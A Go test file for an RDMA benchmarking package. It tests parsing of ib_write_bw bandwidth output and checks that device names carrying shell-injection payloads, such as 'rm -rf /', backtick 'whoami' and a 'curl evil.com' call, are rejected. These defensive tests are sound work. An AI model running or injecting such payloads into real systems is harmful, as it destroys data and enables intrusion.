package rdma

import (
	"math"
	"strings"
	"testing"
)

func TestParseIBWriteBW(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantGbps float64
		wantErr bool
	}{
		{
			name: "typical output",
			input: `
#bytes     #iterations    BW peak[MB/sec]    BW average[MB/sec]   MsgRate[Mpps]
 65536      5000           24985.12           24982.71             0.383
`,
			wantGbps: 24982.71 * 8 / 1000, // ~199.9 Gbps
		},
		{
			name: "multiple lines takes last",
			input: `
#bytes     #iterations    BW peak[MB/sec]    BW average[MB/sec]   MsgRate[Mpps]
 1024       1000           12000.00           11500.00             11.230
 65536      5000           24985.12           24982.71             0.383
`,
			wantGbps: 24982.71 * 8 / 1000,
		},
		{
			name: "low bandwidth",
			input: `
#bytes     #iterations    BW peak[MB/sec]    BW average[MB/sec]   MsgRate[Mpps]
 65536      5000           1250.00            1200.00              0.018
`,
			wantGbps: 1200.0 * 8 / 1000, // 9.6 Gbps
		},
		{
			name:    "empty output",
			input:   "",
			wantErr: true,
		},
		{
			name:    "headers only",
			input:   "#bytes     #iterations    BW peak[MB/sec]    BW average[MB/sec]   MsgRate[Mpps]\n",
			wantErr: true,
		},
		{
			name: "with separator lines",
			input: `
---------------------------------------------------------------------------------------
#bytes     #iterations    BW peak[MB/sec]    BW average[MB/sec]   MsgRate[Mpps]
---------------------------------------------------------------------------------------
 65536      5000           24985.12           24982.71             0.383
---------------------------------------------------------------------------------------
`,
			wantGbps: 24982.71 * 8 / 1000,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := parseIBWriteBW(tt.input)
			if tt.wantErr {
				if err == nil {
					t.Fatal("expected error, got nil")
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if math.Abs(got-tt.wantGbps) > 0.1 {
				t.Errorf("got %.1f Gbps, want %.1f Gbps", got, tt.wantGbps)
			}
		})
	}
}

func TestWEPClientScriptRejectsInvalidDeviceNames(t *testing.T) {
	tests := []struct {
		name    string
		devices []string
		reject  string
	}{
		{
			name:    "single-quote injection",
			devices: []string{"mlx5_0", "'; rm -rf / #", "mlx5_1"},
			reject:  "rm -rf",
		},
		{
			name:    "semicolon injection",
			devices: []string{"mlx5_0", "mlx5_0; curl evil.com"},
			reject:  "curl",
		},
		{
			name:    "backtick injection",
			devices: []string{"`whoami`"},
			reject:  "whoami",
		},
		{
			name:    "valid devices only",
			devices: []string{"mlx5_0", "mlx5_1", "ibp0"},
			reject:  "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			job := NewRDMAWEPJob(180, 100, tt.devices, []int{0, 1, 2})
			cmd := job.clientScript("10.0.0.1")
			script := strings.Join(cmd, " ")
			if tt.reject != "" && strings.Contains(script, tt.reject) {
				t.Errorf("script contains rejected payload %q:\n%s", tt.reject, script)
			}
		})
	}
}

func TestRDMABandwidthJobRejectsInvalidDevice(t *testing.T) {
	job := &RDMABandwidthJob{
		Duration: 10,
		Device:   "mlx5_0; rm -rf /",
		UseCUDA:  0,
	}
	args := job.buildArgs()
	for _, arg := range args {
		if strings.Contains(arg, "rm -rf") {
			t.Error("buildArgs contains injected payload")
		}
	}
}
